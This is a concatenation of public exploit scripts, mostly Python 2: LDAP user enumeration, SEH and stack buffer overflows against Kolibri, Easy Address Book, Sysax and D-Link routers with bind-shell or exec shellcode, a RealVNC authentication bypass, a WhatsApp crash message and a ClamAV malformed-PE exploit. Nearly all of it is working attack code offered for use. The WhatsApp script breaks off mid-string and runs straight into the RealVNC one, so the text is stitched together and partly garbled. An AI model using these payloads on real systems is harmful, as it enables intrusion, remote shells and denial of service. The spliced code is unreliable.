    fd = open(usersFilePath, 'r')

    for user in fd.readlines():
        user = user.replace('\n', '').replace('\r', '')

        # Skip empty and commented lines
        if not user or user[0] == '#':
            continue

        # Set search requirements and directory
        baseDN = '%s@%s' % (user, domain)
        password = 'UnexistingPassword'

        try:
            # Connect and perform an LDAP bind with an invalid password and
            # request results
            l = LDAPconnect(target)
            num = l.bind_s(baseDN, password)
            result = l.result(num)

        except ldap.SERVER_DOWN, _:
            print 'ERROR: unable to connect to the remote LDAP server'
            return

        except:
            # Python LDAP library only handles a number of exception, not
            # all of the possible ones so we except globally and parse the
            # exception message to distinguish between existing and
            # unexisting user
            errorMessage = str(traceback.format_exc())

            detectedErrorCode = re.search(' data ([\w]+),', errorMessage)

            if not detectedErrorCode:
                continue

            detectedErrorCode = detectedErrorCode.group(1).lower()

            if detectedErrorCode in errorCodes.keys():
                users[user] = detectedErrorCode

    if users:
        print '[*] Enumerated users:'

        for user, detectedErrorCode in users.items():
            print '\t[*] User: %s' % user
            print '\t\t[*] LDAP error code: %s' % detectedErrorCode
            print '\t\t[*] LDAP message: %s' % errorCodes[detectedErrorCode]
    else:
        print '[*] No users enumerated'


if __name__ == '__main__':
    usage = '%s [-i] -t <target>' % sys.argv[0]
    parser  = OptionParser(usage=usage, version='0.1')

    try:
        parser.add_option('-d', dest='descr', action='store_true', help='show description and exit')

        parser.add_option('-t', dest='target', help='target IP or hostname')

        parser.add_option('-i', '--info', dest='info', action='store_true',
                          help='show LDAP information gathering results')

        (args, _) = parser.parse_args()

        if not args.descr and not args.target:
            parser.error('Missing the target, -h for help')

    except (OptionError, TypeError), e:
        parser.error(e)

    if args.descr:
        print __doc__
        sys.exit(0)

    domain = LDAPinfo(args.target, args.info)

    if domain:
        domain = str(domain).upper()
        LDAPusersEnum(args.target, domain)
#!/usr/bin/python
# Exploit Title		: Kolibri WebServer 2.0 Get Request SEH Exploit
# Exploit Author	: Revin Hadi S
# Date			: 14/07/2014
# Vendor		: http://www.senkas.com
# Version		: 2.0
# Tested on 		: Windows XP SP2 Eng, Windows Server 2003 Eng, Win 7 SP1 Eng
import socket, sys

help = """Kolibri WebServer 2.0 Get Request SEH Exploit

Target
[1]Windows XP SP2 Eng & Windows 2003 SP2 Eng
[2]Windows 7 SP1 Eng

Usage : %s [rhost] [port] [target]""" %sys.argv[0]

try:
	script, rhost, port, target = sys.argv
except ValueError:
	print help
	exit()

try:
	port = int(port)
	target = int(target)
except ValueError:
	print "Port & Target should number !"
	exit() 

#msfpayload windows/shell_bind_tcp LPORT=5698 R | msfencode -a x86 -e x86/alpha_mixed -t c
shellcode = ("\x89\xe2\xd9\xc4\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x39\x6c\x79\x78\x6f\x79\x75\x50\x57\x70\x53\x30\x65\x30\x6f"
"\x79\x68\x65\x50\x31\x69\x42\x71\x74\x6c\x4b\x43\x62\x46\x50"
"\x6e\x6b\x61\x42\x74\x4c\x6c\x4b\x66\x32\x35\x44\x4e\x6b\x33"
"\x42\x64\x68\x66\x6f\x6c\x77\x51\x5a\x37\x56\x75\x61\x79\x6f"
"\x30\x31\x49\x50\x6e\x4c\x65\x6c\x73\x51\x53\x4c\x45\x52\x46"
"\x4c\x67\x50\x49\x51\x48\x4f\x56\x6d\x53\x31\x38\x47\x39\x72"
"\x4a\x50\x72\x72\x36\x37\x4e\x6b\x62\x72\x54\x50\x6c\x4b\x43"
"\x72\x55\x6c\x36\x61\x6e\x30\x6e\x6b\x33\x70\x72\x58\x6e\x65"
"\x39\x50\x52\x54\x50\x4a\x47\x71\x6e\x30\x32\x70\x4c\x4b\x72"
"\x68\x35\x48\x4e\x6b\x50\x58\x45\x70\x45\x51\x4e\x33\x6d\x33"
"\x35\x6c\x43\x79\x4c\x4b\x64\x74\x4c\x4b\x57\x71\x49\x46\x55"
"\x61\x79\x6f\x50\x31\x6f\x30\x4e\x4c\x39\x51\x48\x4f\x44\x4d"
"\x37\x71\x59\x57\x64\x78\x79\x70\x53\x45\x69\x64\x76\x63\x33"
"\x4d\x79\x68\x37\x4b\x53\x4d\x45\x74\x30\x75\x58\x62\x30\x58"
"\x4c\x4b\x31\x48\x67\x54\x36\x61\x78\x53\x53\x56\x6c\x4b\x74"
"\x4c\x50\x4b\x4c\x4b\x53\x68\x47\x6c\x36\x61\x48\x53\x6c\x4b"
"\x76\x64\x4c\x4b\x73\x31\x4a\x70\x4b\x39\x33\x74\x61\x34\x47"
"\x54\x33\x6b\x71\x4b\x70\x61\x50\x59\x52\x7a\x50\x51\x4b\x4f"
"\x6d\x30\x31\x48\x43\x6f\x53\x6a\x6c\x4b\x66\x72\x38\x6b\x6c"
"\x46\x53\x6d\x70\x68\x34\x73\x36\x52\x33\x30\x53\x30\x52\x48"
"\x72\x57\x50\x73\x45\x62\x53\x6f\x76\x34\x51\x78\x72\x6c\x62"
"\x57\x46\x46\x47\x77\x79\x6f\x78\x55\x78\x38\x4e\x70\x35\x51"
"\x45\x50\x53\x30\x35\x79\x6a\x64\x31\x44\x76\x30\x71\x78\x61"
"\x39\x6d\x50\x50\x6b\x35\x50\x49\x6f\x6a\x75\x32\x70\x30\x50"
"\x72\x70\x66\x30\x61\x50\x36\x30\x31\x50\x50\x50\x51\x78\x68"
"\x6a\x64\x4f\x69\x4f\x59\x70\x4b\x4f\x38\x55\x4b\x39\x38\x47"
"\x44\x71\x79\x4b\x43\x63\x31\x78\x37\x72\x67\x70\x52\x36\x47"
"\x32\x6f\x79\x4a\x46\x72\x4a\x72\x30\x46\x36\x50\x57\x52\x48"
"\x79\x52\x79\x4b\x74\x77\x30\x67\x59\x6f\x58\x55\x46\x33\x61"
"\x47\x53\x58\x6e\x57\x69\x79\x65\x68\x59\x6f\x59\x6f\x69\x45"
"\x46\x33\x30\x53\x76\x37\x50\x68\x74\x34\x78\x6c\x47\x4b\x48"
"\x61\x6b\x4f\x4a\x75\x43\x67\x4d\x59\x38\x47\x65\x38\x61\x65"
"\x70\x6e\x70\x4d\x61\x71\x79\x6f\x39\x45\x70\x68\x31\x73\x50"
"\x6d\x31\x74\x67\x70\x6f\x79\x39\x73\x32\x77\x52\x77\x70\x57"
"\x66\x51\x68\x76\x73\x5a\x54\x52\x46\x39\x63\x66\x69\x72\x69"
"\x6d\x61\x76\x4a\x67\x33\x74\x76\x44\x65\x6c\x55\x51\x73\x31"
"\x6c\x4d\x43\x74\x31\x34\x32\x30\x4a\x66\x67\x70\x57\x34\x56"
"\x34\x36\x30\x30\x56\x56\x36\x30\x56\x43\x76\x42\x76\x32\x6e"
"\x71\x46\x36\x36\x70\x53\x46\x36\x55\x38\x33\x49\x78\x4c\x37"
"\x4f\x6b\x36\x49\x6f\x49\x45\x4b\x39\x59\x70\x50\x4e\x31\x46"
"\x50\x46\x49\x6f\x50\x30\x42\x48\x36\x68\x4e\x67\x35\x4d\x73"
"\x50\x6b\x4f\x59\x45\x6f\x4b\x4c\x30\x48\x35\x4f\x52\x33\x66"
"\x63\x58\x6d\x76\x5a\x35\x6f\x4d\x6f\x6d\x69\x6f\x58\x55\x77"
"\x4c\x63\x36\x33\x4c\x56\x6a\x6b\x30\x69\x6b\x4d\x30\x53\x45"
"\x45\x55\x4f\x4b\x70\x47\x52\x33\x44\x32\x52\x4f\x51\x7a\x63"
"\x30\x66\x33\x6b\x4f\x78\x55\x41\x41")

#egghunter's tag : doge
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x64\x6f\x67\x65\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

if target == 1:
	buff = 792
elif target == 2:
	buff = 794
else:
	print "Input Target option's number !"
	exit()

buffer = "\x90"*(buff-20-32-4)
buffer += egghunter
buffer += "\x90"*20
buffer += "\xEB\xBA\x90\x90"
buffer += "\xC2\x15\x40"		#/p/p/r kolibri.exe

eggshell = "dogedoge"+shellcode

evil = (
"GET /"+buffer+" HTTP/1.1\r\n"
"Host: "+eggshell+"\r\n"
"User-Agent: kepo\r\n"
"Connection: close\r\n\r\n")

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	s.connect((rhost, port))
except socket.error:
	print "[!]Host down or unreachable !"
	exit()
s.send(evil)
s.close()

print "Exploit sended ! Wait a minute the egghunter may take a while to find the tag..."
# Mirror: http://pastebin.com/raw.php?i=CZChGAnG
# Video: https://www.youtube.com/watch?v=V7bnLOohqqI

#!/usr/bin/python
#-*- coding: utf-8 -*
 
# Title: WhatsApp Remote Reboot/Crash App Android
# Product: WhatsApp
# Vendor Homepage: http://www.whatsapp.com
# Vulnerable Version(s): 2.11.476 
# Tested on: WhatsApp v2.11.476 on MotoG 2014 -Android 4.4.4 
# Date: 26/12/2014
# #RemoteExecution - www.remoteexecution.net 
#
# Author Exploit:
#   Daniel Godoy       @0xhielasangre    <danielgodoy@gobiernofederal.com>
# Credits: 
#   Gonza Cabrera
#
# Reference: http://foro.remoteexecution.net/index.php/topic,569.0.html
#
# Custom message with non-printable characters will crash any WhatsApp client < v2.11.476 for android.
# It uses Yowsup library, that provides us with the options of registration, reading/sending messages, and even
# engaging in an interactive conversation over WhatsApp protocol
#

import argparse, sys, os, csv
from Yowsup.Common.utilities import Utilities
from Yowsup.Common.debugger import Debugger
from Yowsup.Common.constants import Constants
from Examples.CmdClient import WhatsappCmdClient
from Examples.EchoClient import WhatsappEchoClient
from Examples.ListenerClient import WhatsappListenerClient
from Yowsup.Registration.v1.coderequest import WACodeRequest
from Yowsup.Registration.v1.regrequest import WARegRequest
from Yowsup.Registration.v1.existsrequest import WAExistsRequest
from Yowsup.Registration.v2.existsrequest import WAExistsRequest as WAExistsRequestV2
from Yowsup.Registration.v2.coderequest import WACodeRequest as WACodeRequestV2
from Yowsup.Registration.v2.regrequest import WARegRequest as WARegRequestV2
from Yowsup.Contacts.contacts import WAContactsSyncRequest
 
import threading,time, base64
 
DEFAULT_CONFIG = os.path.expanduser("~")+"/.yowsup/auth"
COUNTRIES_CSV = "countries.csv"
 
DEFAULT_CONFIG = os.path.expanduser("~")+"/.yowsup/auth"
 
 
######## Yowsup Configuration file #####################
# Your configuration should contain info about your login credentials to Whatsapp. This typically consist of 3 fields:\n
# phone:    Your full phone number including country code, without '+' or '00'
# id:       This field is used in registration calls (-r|-R|-e), and for login if you are trying to use an existing account that is setup
#       on a physical device. Whatsapp has recently deprecated using IMEI/MAC to generate the account's password in updated versions
#       of their clients. Use --v1 switch to try it anyway. Typically this field should contain the phone's IMEI if your account is setup on
#       a Nokia or an Android device, or the phone's WLAN's MAC Address for iOS devices. If you are not trying to use existing credentials
#       or want to register, you can leave this field blank or set it to some random text.
# password: Password to use for login. You obtain this password when you register using Yowsup.
######################################################
MINE_CONFIG ="config"
 
def getCredentials(config = DEFAULT_CONFIG):
    if os.path.isfile(config):
        f = open(config)
         
        phone = ""
        idx = ""
        pw = ""
        cc = ""
         
        try:
            for l in f:
                line = l.strip()
                if len(line) and line[0] not in ('#',';'):
                     
                    prep = line.split('#', 1)[0].split(';', 1)[0].split('=', 1)
                     
                    varname = prep[0].strip()
                    val = prep[1].strip()
                     
                    if varname == "phone":
                        phone = val
                    elif varname == "id":
                        idx = val
                    elif varname =="password":
                        pw =val
                    elif varname == "cc":
                        cc = val
 
            return (cc, phone, idx, pw);
        except:
            pass
 
    return 0
 
def main(phone):
    credentials = getCredentials(MINE_CONFIG or DEFAULT_CONFIG )
 
    if credentials:
         
        countryCode, login, identity, password = credentials
        identity = Utilities.processIdentity(identity)
 
        password = base64.b64decode(password)
 
        # Custom message that will crash WhatsApp
        message = message = "#RemoteExecution# Exploit Title: RealVNC 4.1.0 and 4.1.1 Authentication Bypass Exploit
# Date: 2012-05-13
# Author: @fdiskyou
# e-mail: rui at deniable.org
# Version: 4.1.0 and 4.1.1
# Tested on: Windows XP
# CVE: CVE-2006-2369 
# Requires vncviewer installed
# Basic port of hdmoore/msf2 perl version to python for fun and profit (ease of use)
import select
import thread
import os
import socket
import sys, re

BIND_ADDR = '127.0.0.1'
BIND_PORT = 4444

def pwn4ge(host, port):
	socket.setdefaulttimeout(5)
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		server.connect((host, port))
	except socket.error, msg:
		print '[*] Could not connect to the target VNC service. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1] 
		sys.exit();
	else:
		hello = server.recv(12)
		print "[*] Hello From Server: " + hello
		if hello != "RFB 003.008\n":
			print "[*] The remote VNC service is not vulnerable"
			sys.exit()
		else:
			print "[*] The remote VNC service is vulnerable"
			listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			try:
				listener.bind((BIND_ADDR, BIND_PORT))
			except socket.error , msg:
				print '[*] Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
				sys.exit()
			print "[*] Listener Socket Bind Complete"
			listener.listen(10)
			print "[*] Launching local vncviewer"
			thread.start_new_thread(os.system,('vncviewer ' + BIND_ADDR + '::' + str(BIND_PORT),))
			print "[*] Listener waiting for VNC connections on localhost"
			client, caddr = listener.accept()
			listener.close()
			client.send(hello)
			chello = client.recv(12)
			server.send(chello)
			methods = server.recv(2)
			print "[*] Auth Methods Recieved. Sending Null Authentication Option to Client"
			client.send("\x01\x01")
			client.recv(1)
			server.send("\x01")
			server.recv(4)
			client.send("\x00\x00\x00\x00")
			print "[*] Proxying data between the connections..."
			running = True
			while running:
				selected = select.select([client, server], [], [])[0]
				if client in selected:
					buf = client.recv(8192)
					if len(buf) == 0:
						running = False
					server.send(buf)
				if server in selected and running:
					buf = server.recv(8192)
					if len(buf) == 0:
						running = False
					client.send(buf)
				pass
			client.close()
		server.close()
	sys.exit()

def printUsage():
	print "[*] Read the source, Luke!"

def main():
	try:
		SERV_ADDR = sys.argv[1]
		SERV_PORT = sys.argv[2]
	except:
		SERV_ADDR = raw_input("[*] Please input an IP address to pwn: ")
		SERV_PORT = 5900
	try:
		socket.inet_aton(SERV_ADDR)
	except socket.error:
		printUsage()
	else:
		pwn4ge(SERV_ADDR, int(SERV_PORT))

if __name__ == "__main__":
	main()
#!/usr/bin/python
# Exploit Title: Easy Address Book Web Server 1.6 - USERID Remote Buffer Overflow 
# Version:       1.6
# Date:          2015-08-23
# Author:        Tracy Turben (tracyturben@gmail.com)
# Software Link: http://www.efssoft.com/
# Tested on:     Win7x32-EN,Win7x64-EN


from struct import pack
import socket,sys
import os
  
host="192.168.1.15"
port=80
  
nopsled0 = "A" * 80 

EDX = pack('<L',0x1001AFB8) # 1001AFE0 - 28 = 1001AFB8  JG SHORT 1001AF91 to MOV EAX,EBX POP EBP POP EBX RETN Return to Shellcode   

nopsled1="\x90" * 20

extraroom = "\x90" * 780 
# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# bad characters '\x00\x0a\x0d'

shellcode=("\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab" +
"\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71" +
"\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09" +
"\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c" +
"\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e" +
"\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78" +
"\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22" +
"\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f" +
"\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28" +
"\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50" +
"\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4" +
"\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56" +
"\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56" +
"\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16" +
"\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea" +
"\xa5\x59\x50")
 
payload=nopsled0 + EDX + nopsled1 + shellcode + extraroom
 
buf="GET //addrbook.ghp? HTTP/1.1\r\n"
buf+="User-Agent: Mozilla/4.0\r\n"
buf+="Host:" + host + ":" + str(port) + "\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf+="Accept-Language: en-us\r\n"
buf+="Accept-Encoding: gzip, deflate\r\n"
buf+="Referer: http://" + host + "/\r\n"
buf+="Cookie: SESSIONID=1337; UserID=" + payload + "; PassWD=;\r\n"
buf+="Conection: Keep-Alive\r\n\r\n"
  
print "[*] Connecting to Host " + host + "..."
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)
     
print "[*] Sending malformed request..."
s.send(buf)
 
print "[!] Exploit has been sent!\n"
s.close()
source: http://www.securityfocus.com/bid/63234/info

Multiple Vendors are prone to a stack-based buffer-overflow vulnerability.

Exploiting this vulnerability may allow attackers to execute arbitrary code in the context of the affected devices.

The following are vulnerable:

D-Link DIR-120
D-Link DI-624S
D-Link DI-524UP
D-Link DI-604S
D-Link DI-604UP
D-Link DI-604
D-Link DIR-100
D-Link TM-G5240
PLANEX COMMUNICATIONS BRL-04UR
PLANEX COMMUNICATIONS BRL-04R
PLANEX COMMUNICATIONS BRL-04CW 

import sys
import urllib2

try:
	url = 'http://%s/Tools/tools_misc.xgi?domain=a&set/runtime/diagnostic/pingIp=' % sys.argv[1]
except Exception, e:
	print str(e)
	print 'Usage: %s <target ip>' % sys.argv[0]
	sys.exit(1)

# This is the actual payload; here it is a simple reboot shellcode.
# This payload size is limited to about 200 bytes, otherwise you'll crash elsewhere in /bin/webs.
payload  = "\x3c\x06\x43\x21" # lui     a2,0x4321
payload += "\x34\xc6\xfe\xdc" # ori     a2,a2,0xfedc
payload += "\x3c\x05\x28\x12" # lui     a1,0x2812
payload += "\x34\xa5\x19\x69" # ori     a1,a1,0x1969
payload += "\x3c\x04\xfe\xe1" # lui     a0,0xfee1
payload += "\x34\x84\xde\xad" # ori     a0,a0,0xdead
payload += "\x24\x02\x0f\xf8" # li      v0,4088
payload += "\x01\x01\x01\x0c" # syscall 0x40404

# The payload is split up; some of it before the return address on the stack, some after.
# This little snippet skips over the return address during execution.
# It assumes that your shellcode will not be using the $fp or $t9 registers.
move_sp_fp = "\x03\xa0\xf0\x21" # move $fp, $sp
jump_code =  "\x27\xd9\x02\xd4" # addiu $t9, $fp, 724
jump_code += "\x03\x21\xf8\x08" # jr $t9
jump_code += "\x27\xE0\xFE\xFE" # addiu $zero, $ra, -0x102

# Stitch together the payload chunk(s) and jump_code snippet
shellcode_p1 = move_sp_fp + payload[0:68] + jump_code + "DD"
if len(shellcode_p1) < 86:
	shellcode_p1 += "D" * (86 - len(shellcode_p1))
	shellcode_p2 = ""
else:
	shellcode_p2 = "DD" + payload[68:]

# Build the overflow buffer, with the return address and shellcode
# libc.so base address and ROP gadget offset for the DIR-100, revA, v1.13
# libc_base = 0x2aaee000
# ret_offset = 0x3243C
buf = shellcode_p1 + "\x2A\xB2\x04\x3C" + shellcode_p2

# Normally only admins can access the tools_misc.xgi page; use the backdoor user-agent to bypass authentication
req = urllib2.Request(url+buf, headers={'User-Agent' : 'xmlset_roodkcableoj28840ybtide'})
urllib2.urlopen(req)
# Exploit Title: Sysax Multi Server 6.50 HTTP File Share SEH Overflow RCE Exploit
# Date: 03/21/2016
# Exploit Author: Paul Purcell
# Contact: ptpxploit at gmail
# Vendor Homepage: http://www.sysax.com/
# Vulnerable Version Download: http://download.cnet.com/Sysax-Multi-Server/3000-2160_4-76171493.html (6.50 as of posting date)
# Version: Sysax Multi Server 6.50
# Tested on: Windows XP SP3 English
# Category: Remote Code Execution
#
# Timeline: 03/11/16 Bug found
#           03/14/16 Vender notified
#           03/17/16 Vender acknowledges issue and publishes patch (6.51)
#           03/21/16 Exploit Published
#
# Summary:  This is a post authentication exploit that requires the HTTP file sharing service to be running on
#           Sysas Multi Server 6.50. The SID can be retrieved from your browser's URL bar after logging into the
#           service. Once exploited, the shellcode runs with SYSTEM privileges.  In this example, we attack folder_
#           in dltslctd_name1.htm.  The root path of the user shouldn't break the buffer offset in the stack, though
#           the user will need to have permission to delete folders.  If the user has file delete permissions, file_
#           will work as well.  mk_folder1_name1 is also vulnerable with a modified buffer, so this same exploit can
#           be modified to adapt to a users permissions.

import httplib

target = 'webbackup'
port = 80
sid = '57e546cb7204b60f0111523409e49bdb16692ab5'            #retrieved from browser URL after login
#example: http://hostname/scgi?sid=57e546cb7204b60f0111523409e49bdb16692ab5&pid=dltslctd_name1.htm

#msfvenom -p windows/shell_bind_tcp LPORT=4444 --platform windows -a x86 -f c -b "\x00\x0a"

shell=("\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xd7\xae"
"\x73\xe9\x83\xeb\xfc\xe2\xf4\x2b\x46\xf1\xe9\xd7\xae\x13\x60"
"\x32\x9f\xb3\x8d\x5c\xfe\x43\x62\x85\xa2\xf8\xbb\xc3\x25\x01"
"\xc1\xd8\x19\x39\xcf\xe6\x51\xdf\xd5\xb6\xd2\x71\xc5\xf7\x6f"
"\xbc\xe4\xd6\x69\x91\x1b\x85\xf9\xf8\xbb\xc7\x25\x39\xd5\x5c"
"\xe2\x62\x91\x34\xe6\x72\x38\x86\x25\x2a\xc9\xd6\x7d\xf8\xa0"
"\xcf\x4d\x49\xa0\x5c\x9a\xf8\xe8\x01\x9f\x8c\x45\x16\x61\x7e"
"\xe8\x10\x96\x93\x9c\x21\xad\x0e\x11\xec\xd3\x57\x9c\x33\xf6"
"\xf8\xb1\xf3\xaf\xa0\x8f\x5c\xa2\x38\x62\x8f\xb2\x72\x3a\x5c"
"\xaa\xf8\xe8\x07\x27\x37\xcd\xf3\xf5\x28\x88\x8e\xf4\x22\x16"
"\x37\xf1\x2c\xb3\x5c\xbc\x98\x64\x8a\xc6\x40\xdb\xd7\xae\x1b"
"\x9e\xa4\x9c\x2c\xbd\xbf\xe2\x04\xcf\xd0\x51\xa6\x51\x47\xaf"
"\x73\xe9\xfe\x6a\x27\xb9\xbf\x87\xf3\x82\xd7\x51\xa6\x83\xdf"
"\xf7\x23\x0b\x2a\xee\x23\xa9\x87\xc6\x99\xe6\x08\x4e\x8c\x3c"
"\x40\xc6\x71\xe9\xc6\xf2\xfa\x0f\xbd\xbe\x25\xbe\xbf\x6c\xa8"
"\xde\xb0\x51\xa6\xbe\xbf\x19\x9a\xd1\x28\x51\xa6\xbe\xbf\xda"
"\x9f\xd2\x36\x51\xa6\xbe\x40\xc6\x06\x87\x9a\xcf\x8c\x3c\xbf"
"\xcd\x1e\x8d\xd7\x27\x90\xbe\x80\xf9\x42\x1f\xbd\xbc\x2a\xbf"
"\x35\x53\x15\x2e\x93\x8a\x4f\xe8\xd6\x23\x37\xcd\xc7\x68\x73"
"\xad\x83\xfe\x25\xbf\x81\xe8\x25\xa7\x81\xf8\x20\xbf\xbf\xd7"
"\xbf\xd6\x51\x51\xa6\x60\x37\xe0\x25\xaf\x28\x9e\x1b\xe1\x50"
"\xb3\x13\x16\x02\x15\x83\x5c\x75\xf8\x1b\x4f\x42\x13\xee\x16"
"\x02\x92\x75\x95\xdd\x2e\x88\x09\xa2\xab\xc8\xae\xc4\xdc\x1c"
"\x83\xd7\xfd\x8c\x3c")

arg="folder_"                       #can also be changed to file_ if user has file delete permissions
pid="dltslctd_name1"                #Can be changed, though padding will needed to be updated as well 
junk1="A"*26400                     #Initial pile of junk
noppad="\x90"*296                   #Place to land from our long jump and before our shellcode
junkfill="\x90"*(768-len(shell))    #Fill in after our shellcode till nseh    
nseh="\xeb\x06\x90\x90"             #Short jump over SEH
seh="\xd7\x2a\x92\x5d"              #pop esi # pop edi # ret RPCNS4.dll
jump="\xe9\x13\xfc\xff\xff"         #jump back 1000 bytes for plenty of room for your shellcode
junk2="D"*9500                      #Junk at the end


buff=(arg+junk1+noppad+shell+junkfill+nseh+seh+jump+junk2)

 
head = "Host: Wee! \r\n"
head += "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0\r\n"
head += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
head += "Accept-Language: en-us,en;q=0.5\r\n"
head += "Accept-Encoding: gzip, deflate\r\n"
head += "Referer: http://gotcha/scgi?sid="+sid+"&pid="+pid+".htm\r\n"
head += "Proxy-Connection: keep-alive\r\n"
head += "Content-Type: multipart/form-data; boundary=---------------------------20908311357425\r\n"
head += "Content-Length: 1337\r\n"
head += "If-Modified-Since: *\r\n"
head += "\r\n"
head += "-----------------------------217830224120\r\n"
head += "\r\n"
head += "\r\n"
head += "\r\n"
head += buff

conn = httplib.HTTPConnection(target,port)
conn.request("POST", "/scgi?sid="+sid+"&pid="+pid+".htm", head)

''' 
 
 clamav-0.91.2 exploit ( CVE-2007-6335 )
 (c) Thomas Pollet thomas.pollet@gmail.com

 we own dsize in 
 read(desc, src + dsize, exe_sections[i + 1].rsz)) != exe_sections[i + 1].rsz)
 exploited with randomize_va_space = 0
 
'''

import struct

exe=(
"\x4d\x5a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x4c\x01\x02\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x0f\x01\x0b\x01\x00\x00"
"\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x53\x00\x00\x00\x10\x00\x00"
"\x0c\x00\x00\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00"
"\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x60\x00\x00\x00\x02\x00\x00"
"\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x20\x00\x00\x10\x00\x00\x00\x00\x10\x00"
"\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x0b\x53\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x4d\x45\x57\x00\x46\x12\xd2\xc3\xff\xfa"
"DSIZE"
"\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\xc0"
"\x02\xd2\x75\xdb\x8a\x16\xeb\xd4"
"SSIZE"
"\x00\x50\x00\x00\xff\xff\xff\x00"
"\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\xc0"
"\xbe\x1c\x50\x40\x00\x8b\xde\xad\xad\x50\xad\x97\xb2\x80\xa4\xb6\x80\xff\x13\x73"
"\xf9\x33\xc9\xff\x13\x73\x16\x33\xc0\xff\x13\x73\x21\xb6\x80\x41\xb0\x10\xff\x13"
"\x12\xc0\x73\xfa\x75\x3e\xaa\xeb\xe0\xe8\x76\x4e\x00\x00\x02\xf6\x83\xd9\x01\x75"
"\x0e\xff\x53\xfc\xeb\x26\xac\xd1\xe8\x74\x2f\x13\xc9\xeb\x1a\x91\x48\xc1\xe0\x08"
"\xac\xff\x53\xfc\x3d\x00\x7d\x00\x00\x73\x0a\x80\xfc\x05\x73\x06\x83\xf8\x7f\x77"
"\x02\x41\x41\x95\x8b\xc5\xb6\x00\x56\x8b\xf7\x2b\xf0\xf3\xa4\x5e\xeb\x9b\xad\x85"
"\xc0\x75\x90\xad\x96\xad\x97\x56\xac\x3c\x00\x75\xfb\xff\x53\xf0\x95\x56\xad\x0f"
"\xc8\x40\x59\x74\xec\x79\x07\xac\x3c\x00\x75\xfb\x91\x40\x50\x55\xff\x53\xf4\xab"
"\x85\x01\x75\xe5\xc3\x00\x00\x00\x00\x00\x00\x00"
"COPYSIZE"
"CRAP"
"\x73\x00\xe9\x49\xae\xff\xff\x0c\x50\x00\x00\x00\x00\x00\x00\x00"
